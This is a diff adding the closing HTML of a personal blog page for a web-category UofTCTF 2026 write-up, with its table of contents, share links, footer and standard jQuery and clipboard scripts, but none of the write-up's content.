+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Firewall"><span class="toc-number">1.</span> <span class="toc-text">Firewall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Personal-Blog"><span class="toc-number">2.</span> <span class="toc-text">Personal Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lay-flag"><span class="toc-number">2.1.</span> <span class="toc-text">Lấy flag</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&text=Write up UoftCTF 2026 [WEB]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&is_video=false&description=Write up UoftCTF 2026 [WEB]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Write up UoftCTF 2026 [WEB]&body=Check out this article: https://duonghaonika.github.io/2026/01/11/uoftctf-2026/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&name=Write up UoftCTF 2026 [WEB]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&t=Write up UoftCTF 2026 [WEB]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Duong Quang Hao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
